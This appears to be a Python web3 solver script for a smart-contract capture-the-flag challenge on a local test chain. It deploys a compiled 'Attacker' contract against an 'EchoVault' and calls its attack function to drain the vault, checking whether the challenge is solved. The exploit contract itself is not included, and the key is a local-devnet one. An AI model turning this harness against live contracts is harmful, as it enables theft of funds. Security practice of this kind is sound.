from web3 import Web3
import json
import os

RPC_URL = "http://127.0.0.1:8545"

PRIVATE_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
ACCOUNT = "0x90F79bf6EB2c4f870365E785982E1f101E93b906"

SETUP_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "RPC not connected"

account = w3.eth.account.from_key(PRIVATE_KEY)

SETUP_ABI = [
    {
        "inputs": [],
        "name": "vault",
        "outputs": [{"internalType": "contract EchoVault", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

def send_tx(tx):
    tx["nonce"] = w3.eth.get_transaction_count(account.address)
    tx["gas"] = tx.get("gas", 3_000_000)
    tx["chainId"] = w3.eth.chain_id

    tx.pop("gasPrice", None)

    if "maxFeePerGas" not in tx:
        tx["maxFeePerGas"] = w3.to_wei(2, "gwei")

    if "maxPriorityFeePerGas" not in tx:
        tx["maxPriorityFeePerGas"] = w3.to_wei(1, "gwei")

    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)

setup = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
vault_address = setup.functions.vault().call()

print("[+] Setup :", SETUP_ADDRESS)
print("[+] Vault :", vault_address)
print("[+] Player:", account.address)

attacker_json_path = "out/Attacker.sol/Attacker.json"

if not os.path.exists(attacker_json_path):
    raise FileNotFoundError("Run: forge build")

with open(attacker_json_path, "r") as f:
    attacker_artifact = json.load(f)

attacker_abi = attacker_artifact["abi"]
attacker_bytecode = attacker_artifact["bytecode"]["object"]

Attacker = w3.eth.contract(
    abi=attacker_abi,
    bytecode=attacker_bytecode,
)

print("[+] Deploying attacker...")

deploy_tx = Attacker.constructor(vault_address).build_transaction({
    "from": account.address,
})

deploy_receipt = send_tx(deploy_tx)
attacker_address = deploy_receipt.contractAddress

print("[+] Attacker deployed:", attacker_address)

attacker = w3.eth.contract(
    address=attacker_address,
    abi=attacker_abi,
)

print("[+] Starting attack...")

attack_tx = attacker.functions.attack().build_transaction({
    "from": account.address,
    "value": w3.to_wei(1, "ether"),
    "gas": 5_000_000,
})

attack_receipt = send_tx(attack_tx)

print("[+] Attack tx:", attack_receipt.transactionHash.hex())

solved = setup.functions.isSolved().call()
vault_balance = w3.eth.get_balance(vault_address)
attacker_balance = w3.eth.get_balance(attacker_address)

print("[+] Vault balance   :", w3.from_wei(vault_balance, "ether"), "ETH")
print("[+] Attacker balance:", w3.from_wei(attacker_balance, "ether"), "ETH")
print("[+] Solved:", solved)